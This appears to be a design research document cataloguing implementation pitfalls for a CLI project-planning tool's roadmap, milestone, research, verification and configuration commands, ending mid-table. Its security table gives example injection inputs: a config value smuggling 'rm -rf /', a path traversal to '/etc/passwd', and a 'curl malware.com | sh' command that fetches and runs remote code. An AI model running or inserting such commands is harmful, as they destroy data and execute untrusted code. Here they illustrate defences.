# Pitfalls Research

**Domain:** Full PAUL command implementation (Session + Roadmap + Milestone + Pre-Planning + Research + Quality + Configuration)
**Researched:** 2026-03-05
**Confidence:** MEDIUM (web research + domain expertise, CLI tool patterns, state management best practices)

## Executive Summary

This research documents pitfalls specific to implementing all 26 PAUL commands across 8 command categories. While the v1.0 baseline successfully implements the core loop (init, plan, apply, unify, progress, help) with robust atomic writes and state management, the remaining 20 commands introduce new complexity:

**Most critical risks:**
1. **State corruption** during roadmap mutations (add-phase/remove-phase) - can orphan plans, break dependencies, corrupt state files
2. **Milestone synchronization** across multiple phases - easy to drift, hard to detect
3. **Pre-planning state bloat** - discuss, assumptions, discover generate large research files without cleanup
4. **Configuration conflicts** - multiple config sources (flows, config, map-codebase) create ambiguity

**Infrastructure already in place:**
- Atomic file writes prevent data loss (atomic-writes.ts)
- Zod validation catches schema errors early
- Per-phase state files isolate damage
- Loop enforcer prevents invalid transitions

**Gaps to address:**
- No dependency graph management for roadmap mutations
- No milestone tracking across phases
- No cleanup strategy for research artifacts
- No configuration hierarchy or merge strategy
- No verification state persistence

## Critical Pitfalls

### Pitfall 1: Phase Number Collisions During add-phase

**What goes wrong:**
User adds a phase with number 5 when phase 5 already exists. Or add-phase increments incorrectly, creating gaps (1, 2, 5, 6) or duplicates (1, 2, 2, 3). Plans and state files become unlinked, roadmap references wrong phases, progress shows missing phases.

**Why it happens:**
- add-phase doesn't check existing phase numbers
- Assumes "next available number" is always max + 1
- Multiple concurrent add-phase operations
- Manual editing of ROADMAP.md not reflected in state
- No validation that phase numbers are unique and sequential

**How to avoid:**
1. **Read all phase state files** before adding - not just latest
2. **Validate phase uniqueness** - throw if phase number exists
3. **Offer two modes**: append (max+1) or insert (renumber subsequent)
4. **Atomic phase addition** - write ROADMAP.md + state file + renumber in transaction
5. **Renumber helper** - if inserting, update all phase references atomically
6. **Gap detection** - warn if gaps exist in phase numbering

**Warning signs:**
- Multiple `state-phase-5.json` files
- Phase numbers in ROADMAP.md don't match state files
- "Phase not found" errors when referencing phases
- Gaps in phase sequence (1, 2, 5, 6)
- Progress command skips phases or shows duplicates

**Phase to address:**
add-phase implementation - BEFORE exposing to users

---

### Pitfall 2: Orphaned Plans and State During remove-phase

**What goes wrong:**
Removing phase 3 leaves orphaned plans (3-01-PLAN.json, 3-02-PLAN.json) and state files. State files reference removed phase in dependencies. User can't complete later phases because they depend on removed phase.

**Why it happens:**
- remove-phase only deletes phase entry from ROADMAP.md
- Doesn't scan for dependent phases (phase 4 depends on phase 3)
- Doesn't clean up plan files in `.paul/phases/`
- Doesn't delete `state-phase-N.json`
- No validation that removal is safe

**How to avoid:**
1. **Dependency graph traversal** - check all phases that depend on target
2. **Cascade delete with confirmation** - "Removing phase 3 will also remove phases 4, 5. Continue? (y/N)"
3. **Orphan detection** - list what will be deleted before confirmation
4. **Atomic cleanup** - delete ROADMAP.md entry, state file, ALL plan files in transaction
5. **Safe mode default** - require explicit `--force` if dependencies exist
6. **Post-removal validation** - verify no dangling references

**Warning signs:**
- Plan files in `.paul/phases/` for non-existent phases
- State files for removed phases still exist
- Progress command shows "Phase not found"
- ROADMAP.md has gaps or references to missing phases
- `/paul:plan` fails for phases that don't exist

**Phase to address:**
remove-phase implementation - requires dependency graph first

---

### Pitfall 3: Phase Dependency Chain Corruption

**What goes wrong:**
add-phase or remove-phase breaks the dependency chain defined in ROADMAP.md. Phase 4 depends on phase 3, but remove-phase deletes 3 without updating 4's dependencies. Or add-phase inserts phase 2.5 but doesn't update phase 3's dependencies to point to 2.5 instead of 2.

**Why it happens:**
- No dependency graph data structure
- ROADMAP.md is human-readable but not machine-validated
- Dependencies stored as strings, not references
- No cascade updates when graph changes
- Manual edits to ROADMAP.md bypass validation

**How to avoid:**
1. **Parse ROADMAP.md into dependency graph** on load
2. **Validate graph integrity** - no cycles, all nodes exist
3. **On remove-phase**: update dependents' parents
4. **On add-phase**: offer to link to existing phases
5. **Graph validation command** - `/paul:verify-graph` (add to roadmap commands)
6. **Immutable references** - use phase IDs, not numbers (though numbers are more user-friendly)

**Warning signs:**
- Circular dependencies in ROADMAP.md
- Phase dependencies reference non-existent phases
- add-phase succeeds but roadmap is now inconsistent
- remove-phase succeeds but later phases can't complete
- Progress command shows dependency errors

**Phase to address:**
Both add-phase and remove-phase - need dependency graph first

---

### Pitfall 4: Milestone State Desynchronization

**What goes wrong:**
Milestone marked as "complete" in `.paul/milestones.json` but referenced phases still incomplete. Or milestone shows 50% progress but all phases report 100%. Milestone data doesn't match actual phase state.

**Why it happens:**
- Milestone state stored separately from phase state
- No automatic recalculation when phases change
- Manual milestone edits override calculated state
- Milestone completion criteria not validated against phase completion
- No event-driven updates (phase completes → milestone updates)

**How to avoid:**
1. **Calculate milestone progress dynamically** - don't store as mutable state
2. **Milestone as view, not state** - derive from phase files
3. **Complete-milestone validates** - check all phases are done
4. **Discuss-milestone shows live data** - always read current phase state
5. **Milestone completion criteria** - explicit validation rules
6. **Milestone lock** - once complete, prevent phase modifications (or warn)

**Warning signs:**
- Milestone progress doesn't sum to phase progress
- Milestone marked complete but phases show incomplete
- Progress command shows inconsistent milestone vs. phase data
- Manual edits to milestone file break state
- /paul:complete-milestone succeeds but phases aren't done

**Phase to address:**
All three milestone commands - design milestone as computed view, not stored state

---

### Pitfall 5: Multiple Active Milestones

**What goes wrong:**
User creates milestones for v1.1, v1.2, v2.0 all simultaneously. All marked as "active". No way to tell which is current work. Progress shows all milestones, user confused about priorities.

**Why it happens:**
- No "current milestone" concept
- Milestones don't have status (planned, active, complete, deferred)
- No milestone ordering or sequencing
- Multiple milestones can reference same phases
- No validation that only one milestone should be active

**How to avoid:**
1. **Milestone status enum** - planned, active, complete, deferred, cancelled
2. **Single active milestone constraint** - validate on milestone creation
3. **Milestone dependencies** - v2.0 depends on v1.1 being complete
4. **Current milestone pointer** - in state or derived from status
5. **Milestone activation command** - `/paul:milestone --activate`
6. **Milestone retirement** - auto-complete or defer old milestones

**Warning signs:**
- Multiple milestones show "active" in progress
- User asks "which milestone am I working on?"
- Phases assigned to multiple active milestones
- Milestone completion criteria overlap or conflict
- Progress command shows confusing milestone list

**Phase to address:**
milestone and complete-milestone commands - enforce single active milestone

---

### Pitfall 6: Pre-Planning Artifacts Accumulate Without Cleanup

**What goes wrong:**
`/paul:discuss`, `/paul:assumptions`, `/paul:discover`, `/paul:consider-issues` create research files (`.paul/research/`, `.paul/assumptions/`, etc.) that grow indefinitely. No cleanup strategy. Storage bloats. Hard to find current research among dozens of old files.

**Why it happens:**
- Commands only create, never delete
- No "archived" status for old research
- No size limits or retention policy
- User assumes "PAUL will handle cleanup"
- Research files aren't tied to phase completion

**How to avoid:**
1. **Research retention policy** - auto-archive after phase completes
2. **Per-phase research directories** - easy to bulk-delete with phase
3. **Archive command** - `/paul:research --archive-phase 1`
4. **Size warnings** - warn if research > 10MB per phase
5. **Link research to phase** - delete research when phase removed
6. **Current research pointer** - one "active" research file per phase

**Warning signs:**
- `.paul/research/` has hundreds of files
- Disk usage by `.paul/` grows without bound
- User asks "which research is current?"
- Research files for completed phases still in active directory
- Git ignores `.paul/` but it's still bloated

**Phase to address:**
All four pre-planning commands - design with cleanup from day 1

---

### Pitfall 7: Research Redundancy and Duplication

**What goes wrong:**
`/paul:discover` and `/paul:assumptions` capture the same information twice. `/paul:discuss` generates notes that duplicate what's in `assumptions.md`. Users don't know which file is authoritative. Contradictory information across files.

**Why it happens:**
- No clear boundary between commands
- Commands have overlapping capture forms
- No "source of truth" concept
- Users run all four commands "just to be safe"
- No deduplication or merging strategy

**How to avoid:**
1. **Clear command boundaries** - document what each command captures
2. **Command interaction rules** - "assumptions before discover", etc.
3. **Deduplication on write** - check if captured before adding
4. **Merge command** - `/paul:research --merge` to combine artifacts
5. **Authoritative source tagging** - mark which file is primary
6. **Cross-reference** - link related files (assumptions → discuss)

**Warning signs:**
- Same assumption in assumptions.md AND discover.md
- User asks "should I run all four commands?"
- Research files contradict each other
- Discuss notes duplicate assumptions
- No clear entry point for reading research

**Phase to address:**
All four pre-planning commands - design with clear boundaries and deduplication

---

### Pitfall 8: Verification State Not Persisted

**What goes wrong:**
`/paul:verify` runs tests and checks but doesn't save results. User runs verify, sees all tests pass, but later there's no record. Next verify has to re-run everything. Can't track historical verification results or trends.

**Why it happens:**
- Verify command prints to stdout only
- No verification result schema or storage
- "Stateless" approach seems simpler initially
- No verification history needed for core loop
- Didn't anticipate need for verification tracking

**How to avoid:**
1. **Verification result schema** - timestamp, tests passed/failed, issues found
2. **Save to `.paul/verification.json`** - per-phase verification history
3. **Trend tracking** - show "tests passed: 45/50 (was 40/50 yesterday)"
4. **Verification snapshots** - quick re-run of last verification
5. **Verification lock** - prevent plan apply if verification failed
6. **Verification summary** - show recent history in progress command

**Warning signs:**
- User asks "when did tests last pass?"
- Verify has to re-run everything every time
- No record of which tests failed historically
- Can't tell if verification is improving or regressing
- No evidence to show code reviewer that tests pass

**Phase to address:**
verify command - design with persistence from day 1

---

### Pitfall 9: plan-fix Creates Infinite Loop

**What goes wrong:**
`/paul:plan-fix` generates a new plan to fix verification failures. User runs plan, verify still fails. Runs plan-fix again, generates another plan. Infinite loop of plan → apply → verify → fail → plan-fix.

**Why it happens:**
- plan-fix doesn't analyze root cause
- Generates superficial fixes
- Doesn't learn from previous failures
- No limit on retry attempts
- plan-fix can generate same failing plan twice

**How to avoid:**
1. **Root cause analysis** - analyze verification failures before generating plan
2. **Fix idempotency check** - don't generate plan if already attempted
3. **Retry limit** - fail after 3 plan-fix attempts with same error
4. **plan-fix history** - track previous attempts, avoid repetition
5. **Human intervention checkpoint** - "Manual review required after 2 failed attempts"
6. **Diagnostic output** - show WHY verification failed, not just THAT it failed

**Warning signs:**
- User runs plan-fix more than 3 times in a row
- Verification fails with same error repeatedly
- Generated plans look similar or identical
- User says "plan-fix isn't helping"
- Infinite loop in plan → apply → verify cycle

**Phase to address:**
plan-fix command - design with analysis, history, and limits

---

### Pitfall 10: Configuration Hierarchy Ambiguity

**What goes wrong:**
`/paul:config`, `/paul:flows`, `/paul:map-codebase` all modify configuration. User doesn't know which command takes precedence. Config set by `/paul:config` is overridden by `/paul:flows`. No clear hierarchy. Confusion about "which config is active?"

**Why it happens:**
- Three separate config commands without clear separation
- No configuration merging strategy
- Config sources not documented as hierarchy
- Commands overwrite instead of merge
- No "show effective config" command

**How to avoid:**
1. **Clear config hierarchy** - document precedence: defaults < config < flows < map-codebase
2. **Merged configuration view** - `/paul:config --show-effective`
3. **Config schema validation** - ensure configs are compatible
4. **Override warnings** - "flows config overrides config setting X"
5. **Config isolation** - each command manages distinct config section
6. **Config lock** - prevent contradictory settings across commands

**Warning signs:**
- User asks "which config is actually being used?"
- Setting X in config has no effect (overridden)
- Two commands set same key, unclear which wins
- No way to see merged/active configuration
- Surprise behavior due to unexpected config overrides

**Phase to address:**
All three configuration commands - design hierarchy and merging before implementation

---

### Pitfall 11: map-codebase Performance Degradation

**What goes wrong:**
`/paul:map-codebase` scans entire project directory, reads all files, builds AST or index. On large projects (10k+ files), this takes minutes. Command feels stuck. User kills it. Partial maps are left behind.

**Why it happens:**
- No incremental mapping - rescans everything every time
- No file filtering - maps `.git/`, `node_modules/`, etc.
- No progress feedback - user thinks command hung
- No caching - can't reuse previous maps
- No size limits - runs forever on massive codebases

**How to avoid:**
1. **Exclude patterns** - `.gitignore`, `node_modules/`, `.paul/` auto-excluded
2. **Incremental mapping** - only scan changed files since last map
3. **Progress indicator** - "Scanning file 1000/5000..."
4. **Cache maps** - store `.paul/codebase-map.json`, reuse if unchanged
5. **Size limits** - fail gracefully if > 50k files or 1GB codebase
6. **Timeout** - abort after 5 minutes with "codebase too large, try incremental mode"

**Warning signs:**
- `/paul:map-codebase` takes > 30 seconds
- Command appears hung with no output
- Map files are 100MB+ (too large)
- User complains "map-codebase is slow"
- Partial maps left in `.paul/` after command killed

**Phase to address:**
map-codebase command - design with incremental mapping and size limits

---

### Pitfall 12: Serialization Blind Spots (Existing - from v1.0 research)

**What goes wrong:**
Session state fails to serialize/deserialize correctly because non-serializable objects (functions, circular references, class instances without serialization support) are stored in state. Session appears to save but crashes on resume or loses critical context.

**Why it happens:**
Developers assume "it's just JSON" without realizing:
- TypeScript class instances don't serialize to JSON automatically
- Functions/closures can't be persisted
- Circular references cause JSON.stringify to throw
- Date objects become strings, losing type information
- undefined becomes null in JSON

**How to avoid:**
1. **Use Zod schemas for ALL session data** (OpenPAUL already has this)
2. **Store only plain data**, reconstruct objects on resume
3. **Test serialization immediately** - don't wait for production
4. **Version your session schemas** - allow migration from older formats
5. **Validate on both write AND read** - catch corruption early

**Warning signs:**
- "Works on my machine" but fails on resume
- Session loads but missing key context
- JSON.stringify throws "circular reference" errors
- TypeScript types don't match runtime data
- Session files grow unexpectedly large

**Phase to address:**
Pause command implementation - validate serialization BEFORE building resume

---

### Pitfall 13: Orphaned Session Files (Existing - from v1.0 research)

**What goes wrong:**
Multiple paused session files accumulate without cleanup. Users can't tell which is current, resume picks wrong session, or storage bloats with abandoned sessions. Context becomes fragmented across multiple "paused" states.

**Why it happens:**
- No automatic cleanup of old session files
- Pause creates new file instead of replacing
- No session naming/identification system
- Users pause multiple times without realizing
- Failed resume attempts leave zombie files

**How to avoid:**
1. **One active session per project** - replace on new pause
2. **Timestamp-based naming** - easy to identify recency
3. **Metadata header** - who paused, when, what phase
4. **Cleanup on successful resume** - delete after restoration
5. **List command** - show all sessions with metadata
6. **Age-based pruning** - warn about old sessions (7+ days)

**Warning signs:**
- Multiple `session-*.json` files in `.paul/`
- User asks "which session should I resume?"
- Resume loads old context, not recent work
- Confusion about "current" session state
- Storage growing unexpectedly

**Phase to address:**
Both pause AND resume - pause creates correctly, resume cleans up

---

### Pitfall 14: Incomplete Context Capture (Existing - from v1.0 research)

**What goes wrong:**
Paused session lacks critical context needed to resume effectively. Key decisions, mental state, "what I was about to do", file modifications, or dependencies are missing. Resume feels like "starting over" despite pause.

**Why it happens:**
- Developers capture WHAT but not WHY
- Mental context ("I was debugging X because...") not captured
- External state (git status, environment variables) ignored
- Mid-task context (half-implemented feature) not documented
- Assumptions about "I'll remember" prove false

**How to avoid:**
1. **Structured capture templates** (like GSD's continue-here.md format)
2. **Prompt for context** - don't assume user will volunteer it
3. **Capture environmental state** - git branch, uncommitted changes
4. **Include "next action"** - specific first step on resume
5. **Record decision rationale** - not just decisions made
6. **Auto-detect file modifications** - don't rely on user to list

**Warning signs:**
- Resume requires extensive re-reading files
- "Why did I do this?" moments after resume
- Decisions get re-debated in new session
- Missing context about blockers or constraints
- User says "I'll just start fresh" instead of resuming

**Phase to address:**
Pause command - this is WHERE context is captured

---

### Pitfall 15: Handoff Document Drift (Existing - from v1.0 research)

**What goes wrong:**
Handoff documents become stale, incomplete, or disconnected from actual project state. New developers receive outdated context, wrong phase information, or missing critical decisions. Handoff creates MORE confusion instead of less.

**Why it happens:**
- Handoff generated from outdated session state
- Manual edits to handoff not reflected in project state
- Handoff format too rigid for real-world complexity
- No validation that handoff matches current project state
- Handoff created after work already done (working backwards)

**How to avoid:**
1. **Generate handoff FROM current state** - not from memory
2. **Include verification step** - confirm handoff accuracy
3. **Link to actual files** - not just descriptions
4. **Timestamp and sign** - who created, when, from what state
5. **Validate against current ROADMAP.md** - ensure phase alignment
6. **Include "what's changed since last handoff"** section

**Warning signs:**
- Handoff references wrong phase number
- Decisions in handoff don't match PROJECT.md
- New developer confused by handoff content
- Handoff contradicts actual codebase state
- Multiple handoff versions with unclear currency

**Phase to address:**
Handoff command - separate from pause, focused on external sharing

---

### Pitfall 16: Deprecation Without Migration Path (Existing - from v1.0 research)

**What goes wrong:**
`/paul:status` is deprecated but users still have:
- Muscle memory typing the command
- Scripts/aliases referencing it
- Documentation mentioning it
- Confusion about replacement command

Deprecation creates frustration instead of smooth transition.

**Why it happens:**
- Deprecation message doesn't explain WHY
- Replacement command not immediately obvious
- No grace period with both commands working
- Error message feels like "you're wrong" instead of "here's the better way"
- Documentation not updated in sync

**How to avoid:**
1. **Grace period** - both old and new work initially
2. **Helpful error messages** - "Use /paul:progress instead (it does X better)"
3. **Migration documentation** - clear mapping of old → new
4. **Update ALL docs simultaneously** - README, commands, examples
5. **Track usage** - know when safe to fully remove
6. **Provide transition script** if behavior differs significantly

**Warning signs:**
- Users still typing deprecated command after months
- Support questions about "what happened to status?"
- Scripts breaking silently
- Confusion in chat/communities about replacement
- Deprecation message feels unhelpful

**Phase to address:**
Status deprecation - make it a GOOD deprecation, not just removal

---

### Pitfall 17: State Version Mismatch (Existing - from v1.0 research)

**What goes wrong:**
Session paused with v1.0 state format, but resumed with v1.1 code that expects different schema. Resume fails, corrupts data, or silently loses information. Version compatibility not handled.

**Why it happens:**
- Session files live longer than expected (weeks/months)
- Schema evolution happens without migration strategy
- No version field in session files
- Resume assumes current schema, doesn't check
- Breaking schema changes deployed without migration

**How to avoid:**
1. **Version field in ALL session files** - schema version number
2. **Migration functions** - upgrade v1 → v2 → v3 on load
3. **Backward compatible reads** - new code reads old formats
4. **Validation on load** - detect incompatible versions early
5. **Clear error messages** - "Session from v1.0, need to migrate with..."
6. **Test with old session files** - don't just test current version

**Warning signs:**
- Resume fails after update
- Session loads but with missing/wrong data
- Zod validation errors on previously valid sessions
- "This session was created with an older version" errors
- Users told to "delete and start over" as only option

**Phase to address:**
Both pause and resume - pause writes version, resume checks it

---

### Pitfall 18: Race Conditions in State Updates (Existing - from v1.0 research)

**What goes wrong:**
Two processes attempt to update session state simultaneously:
- Multiple OpenCode instances running
- Background task updating while user pauses
- Resume starting while state still being written

Data corruption, lost updates, or inconsistent state results.

**Why it happens:**
- File-based storage has no locking mechanism
- Asynchronous writes not awaited properly
- No atomic update strategy
- Concurrent access not considered in design
- "Quick pause" while background work continues

**How to avoid:**
1. **Atomic writes** (OpenPAUL already has atomic-writes.ts)
2. **Lock files** - prevent concurrent modifications
3. **Single writer pattern** - one process owns state
4. **Conflict detection** - timestamp checks before write
5. **Merge strategies** - when conflicts detected
6. **Clear ownership** - who's allowed to modify state when

**Warning signs:**
- "State file corrupted" errors
- Lost updates - work done but not in session
- Session shows wrong phase/plan after concurrent access
- JSON parse errors in state files
- Inconsistent state after "quick pause"

**Phase to address:**
State manager enhancement - BEFORE adding session commands

---

## Technical Debt Patterns

Shortcuts that seem reasonable but create long-term problems.

| Shortcut | Immediate Benefit | Long-term Cost | When Acceptable |
|----------|-------------------|----------------|-----------------|
| No session version field | Faster initial implementation | Breaking changes require manual migration | Never - version from day 1 |
| Skip validation on resume | Faster load times | Silent data corruption, hard-to-debug failures | Never - always validate |
| Store functions in state | Convenient access | Can't serialize, breaks pause/resume | Never - reconstruct from data |
| Single giant session file | Simpler file management | Hard to debug, slow to load, risky updates | Only for <10KB state |
| No cleanup of old sessions | Avoid "delete user data" risk | Storage bloat, confusion about current session | Never - auto-cleanup with confirmation |
| Generate handoff manually | Flexible, can add context | Drifts from actual state, inconsistent format | Never - always generate from state |
| Phase numbers as strings | Simpler parsing | Can't do math, easy to have duplicates | Never - use numbers, pad to string only for display |
| Milestone as mutable state | Simple read/write | Desyncs with actual phase completion | Never - compute from phases, don't store |
| No dependency graph | Simpler ROADMAP.md | Impossible to validate mutations, cascading errors | Only for <5 phases |
| Research files without cleanup | Don't lose any work | Storage bloat, can't find current info | Never - archive with phase completion |
| Config overwrites instead of merges | Simpler implementation | User confusion, unexpected overrides | Never - design hierarchy first |
| map-codebase scans everything | Guaranteed complete map | Takes forever on large codebases | Never - incremental from day 1 |

## Integration Gotchas

Common mistakes when connecting to existing OpenPAUL state.

| Integration Point | Common Mistake | Correct Approach |
|-------------------|----------------|------------------|
| **Phase State** | Assume one active phase | Check all phase files, handle multiple active phases gracefully |
| **Plan References** | Store plan ID only | Store plan ID + status + timestamp for context |
| **File Manager** | Create parallel session storage | Extend FileManager with session methods, reuse patterns |
| **State Manager** | Bypass for session commands | Extend StateManager, maintain single source of truth |
| **Loop Phase** | Ignore current loop position | Include loop phase in session context, validate on resume |
| **Metadata Field** | Ignore existing metadata | Preserve and extend, don't replace |
| **ROADMAP.md** | Parse as text, assume format | Parse into dependency graph, validate structure |
| **Milestone Data** | Store as separate JSON | Compute from phase state, don't duplicate |
| **Research Files** | Create in root `.paul/` | Create per-phase subdirectories for cleanup |
| **Verification Results** | Print to stdout only | Save to `.paul/verification.json` for history |
| **plan-fix Plans** | Treat as regular plans | Mark as fix attempt, track history to prevent loops |
| **Config Commands** | All write to same file | Design hierarchy: defaults < config < flows < map-codebase |
| **map-codebase Cache** | No caching strategy | Incremental updates, timestamp-based invalidation |

## Performance Traps

Patterns that work at small scale but fail as usage grows.

| Trap | Symptoms | Prevention | When It Breaks |
|------|----------|------------|----------------|
| **Large session files** | Slow pause/resume (>1s), memory issues | Store references, not full content; compress old sessions | >100KB session files |
| **No session indexing** | Resume has to scan all files to find current | Maintain session index file, update on pause | >10 paused sessions |
| **Full state serialization** | Pause takes >500ms | Incremental updates, diff-based serialization | State >1MB |
| **No lazy loading** | Resume loads entire history | Load recent first, lazy-load older context | >50 plans/phase |
| **Unbounded history** | `.paul/` grows without limit | Age-based cleanup, archive old sessions | >1GB total storage |
| **map-codebase full scan** | Takes minutes, appears hung | Incremental mapping, exclude patterns, caching | >10k files or >100MB codebase |
| **Research file bloat** | `.paul/research/` huge, slow searches | Archive with phase completion, per-phase directories | >1GB research artifacts |
| **No verification caching** | Reruns all tests every time | Cache test results, rerun only changed | Test suite >5 minutes |
| **Dependency graph recalc** | Slow roadmap operations, add/remove sluggish | Cache graph, invalidate on changes | >20 phases |
| **Milestone full recalc** | Progress command slow, especially with many phases | Cache progress, update on phase completion | >50 phases |
| **Config merge on every read** | Config reads slow | Merge once at startup, cache result | Many config reads per command |
| **No file watching** | Manual trigger of map-codebase | Watch for file changes, auto-incremental map | Frequent codebase changes |

## Security Mistakes

Domain-specific security issues beyond general web security.

| Mistake | Risk | Prevention |
|---------|------|------------|
| **Sessions in version control** | Expose project state, decisions, possibly secrets | Add `session-*.json` to `.gitignore` from day 1 |
| **No session ownership** | Anyone can resume/modify anyone's session | Include `created_by` field, validate on operations |
| **Session tampering** | Modified session files inject malicious context | Checksums or signatures on session files |
| **Sensitive data in sessions** | API keys, tokens captured in paused state | Sanitize before persist, never store secrets |
| **Session file permissions** | World-readable session files | Set restrictive permissions (0600) on creation |
| **Milestone spoofing** | User marks milestone complete without validation | Validate against phase state, require admin or phase completion |
| **Codebase map exposes internal structure** | Attackers learn project layout | Add `.gitignore` filtering, respect access controls |
| **Assumptions files in VC** | Expose business logic, security assumptions | Add `assumptions.md` to `.gitignore` or document as public |
| **plan-fix injection** | Malicious user injects code via plan-fix | Validate plan-fix output, sandbox execution |
| **Config command injection** | `config --set "KEY=VALUE; rm -rf /"` | Parse config values strictly, no shell execution |
| **Research file path traversal** | `research --output ../../etc/passwd` | Validate and sandbox output paths |
| **Verification command injection** | `verify --cmd "curl malware.com \| sh"` | Whitelist allowed verification commands, no arbitrary execution |

## UX Pitfalls

Common user experience mistakes in command design.

| Pitfall | User Impact | Better Approach |
|---------|-------------|-----------------|
| **"Paused successfully" with no context** | User unsure what was captured, afraid to trust it | Show summary: "Captured: phase 2, task 3/7, 3 decisions, 2 blockers" |
| **Resume with no feedback** | User doesn't know if it worked, what changed | Show diff: "Restored from 2h ago: task 3→4, decision added, blocker resolved" |
| **Orphaned session files** | User confused which to resume | Always show session metadata when multiple exist |
| **Handoff with no preview** | User afraid to share incomplete/wrong info | Preview handoff, allow edits before finalizing |
| **Deprecation with no guidance** | User frustrated, doesn't know what to do | Show exact replacement command and why it's better |
| **Session with no timestamp** | User doesn't know how old context is | Always show age: "This session is 3 days old" |
| **add-phase without preview** | User doesn't know what will change | Show dry-run: "Adding phase 5. Will create: state-phase-5.json, update ROADMAP.md" |
| **remove-phase without confirmation** | Accidentally deletes critical phase | Require confirmation, show what will be deleted |
| **Milestone progress without context** | "50% complete" but what does that mean? | Show breakdown: "2/4 phases complete. Remaining: Phase 3 (API), Phase 4 (UI)" |
| **Research command output too verbose** | Can't find the insights | Structured sections with clear headings, summary at top |
| **verify command shows no history** | Can't tell if improving or regressing | Show trend: "Tests: 45/50 (was 40/50 yesterday, +5)" |
| **plan-fix generates generic plan** | Plan doesn't actually fix the issue | Root cause analysis first, targeted fixes |
| **config command shows merged view only** | User confused about which source set what | Show config sources: "X=10 (from config), Y=20 (from flows)" |
| **map-codebase hangs without progress** | User thinks command crashed, kills it | Progress bar: "Scanning file 1000/5000..." |
| **Multiple milestones, all "active"** | User doesn't know what to work on | Single active milestone, show "Current work" section clearly |

## "Looks Done But Isn't" Checklist

Things that appear complete but are missing critical pieces.

**Session Management (Already in v1.0 research)**
- [ ] **Pause command:** Often missing validation that session is usable — verify round-trip test (pause → resume in test)
- [ ] **Resume command:** Often missing conflict detection (what if state changed since pause?) — verify state comparison
- [ ] **Handoff document:** Often missing verification against actual project state — verify handoff matches ROADMAP.md phase
- [ ] **Status deprecation:** Often missing migration guide — verify docs updated AND deprecation message helpful
- [ ] **Session storage:** Often missing cleanup strategy — verify old sessions handled correctly
- [ ] **Version compatibility:** Often missing version field — verify sessions have schema version

**Roadmap Management**
- [ ] **add-phase:** Often missing dependency graph update — verify depends_on updated for subsequent phases
- [ ] **add-phase:** Often missing phase number validation — verify no duplicate phase numbers
- [ ] **add-phase:** Often missing ROADMAP.md update — verify both state file and ROADMAP.md written atomically
- [ ] **remove-phase:** Often missing cascade delete — verify dependent phases removed or updated
- [ ] **remove-phase:** Often missing orphan cleanup — verify plan files and state files deleted
- [ ] **Both:** Often missing dependency graph — verify graph exists before implementing

**Milestone Management**
- [ ] **milestone:** Often missing single active milestone constraint — verify can't have multiple active milestones
- [ ] **complete-milestone:** Often missing phase completion validation — verify all phases done before marking complete
- [ ] **discuss-milestone:** Often missing live data — verify shows current phase state, not cached
- [ ] **All:** Often missing milestone schema — verify milestone fields defined and validated
- [ ] **All:** Often missing milestone-roadmap sync — verify milestone progress computed from phases

**Pre-Planning**
- [ ] **discuss:** Often missing structured capture format — verify output has sections (context, decisions, blockers)
- [ ] **assumptions:** Often missing validation — verify assumptions are testable or flagged as untestable
- [ ] **discover:** Often missing deduplication — verify doesn't add already-discovered items
- [ ] **consider-issues:** Often missing issue tracking — verify issues have IDs, status, priority
- [ ] **All four:** Often missing cleanup strategy — verify research files archived/deleted with phase
- [ ] **All four:** Often missing cross-referencing — verify research files link to each other

**Research**
- [ ] **research:** Often missing output format definition — verify research result schema
- [ ] **research:** Often missing link to phase — verify research stored in per-phase directory
- [ ] **research-phase:** Often missing scope definition — verify what files/components are researched
- [ ] **Both:** Often missing artifact naming — verify consistent naming scheme (research-topic-DATE.md)
- [ ] **Both:** Often missing archive strategy — verify old research doesn't bloat storage

**Quality**
- [ ] **verify:** Often missing result persistence — verify results saved to `.paul/verification.json`
- [ ] **verify:** Often missing trend tracking — verify shows history, not just current run
- [ ] **verify:** Often missing verification schema — verify what constitutes a "pass"
- [ ] **plan-fix:** Often missing root cause analysis — verify analyzes failures before generating plan
- [ ] **plan-fix:** Often missing idempotency check — verify doesn't generate same plan twice
- [ ] **plan-fix:** Often missing retry limit — verify fails after N attempts with guidance

**Configuration**
- [ ] **config:** Often missing schema validation — verify config values match expected types/ranges
- [ ] **config:** Often missing merge strategy — verify how config interacts with flows/map-codebase
- [ ] **flows:** Often missing flow definition schema — verify what a "flow" is
- [ ] **flows:** Often missing conflict resolution — verify what happens when flows override config
- [ ] **map-codebase:** Often missing incremental mapping — verify only scans changed files
- [ ] **map-codebase:** Often missing progress feedback — verify shows scan progress
- [ ] **map-codebase:** Often missing size limits — verify fails gracefully on large codebases
- [ ] **All three:** Often missing hierarchy documentation — verify precedence documented and enforced
- [ ] **All three:** Often missing "show effective config" — verify user can see merged/active config

## Recovery Strategies

When pitfalls occur despite prevention, how to recover.

| Pitfall | Recovery Cost | Recovery Steps |
|---------|---------------|----------------|
| **Corrupted session file** | LOW | Delete session file, resume from STATE.md context |
| **Version mismatch** | MEDIUM | Write migration script, run on all session files, test thoroughly |
| **Orphaned sessions** | LOW | List sessions with metadata, delete old ones manually, add cleanup to resume |
| **Incomplete context** | MEDIUM | Can't recover missing context - pause must be re-done. Add better capture prompts. |
| **Handoff drift** | LOW | Regenerate from current state. Old handoff already sent - send correction. |
| **State race condition** | HIGH | Restore from backup/git, implement locking to prevent recurrence |
| **Missing version field** | HIGH | Add version field, assume v1 for unversioned files, test extensively |
| **Phase number collision** | MEDIUM | Manually renumber phases, update all references in ROADMAP.md and state files |
| **Orphaned plans after remove-phase** | MEDIUM | Manually delete plan files, update state dependencies |
| **Broken dependency chain** | HIGH | Manually repair ROADMAP.md dependencies, validate with graph traversal |
| **Milestone desync** | LOW | Delete milestone file, recalculate from phase state |
| **Multiple active milestones** | LOW | Manually set one to "active", others to "planned" |
| **Research bloat** | LOW | Manually archive old research files, add cleanup to future phases |
| **Research duplication** | MEDIUM | Manually merge duplicate files, add deduplication to commands |
| **Missing verification history** | LOW | Can't recover history - start tracking from now |
| **plan-fix infinite loop** | MEDIUM | Manually break loop, analyze root cause, fix manually |
| **Config hierarchy confusion** | LOW | Manually determine effective config, document hierarchy |
| **map-codebase performance** | MEDIUM | Implement incremental mapping, clear cache, rescan |
| **Missing dependency graph** | HIGH | Parse ROADMAP.md, validate structure, implement graph |

## Pitfall-to-Phase Mapping

How roadmap phases should address these pitfalls.

**Session Management (Already in v1.0 research)**
| Pitfall | Prevention Phase | Verification |
|---------|------------------|--------------|
| Serialization Blind Spots | Pause command implementation | Test: pause with complex state, resume in fresh process, verify all data |
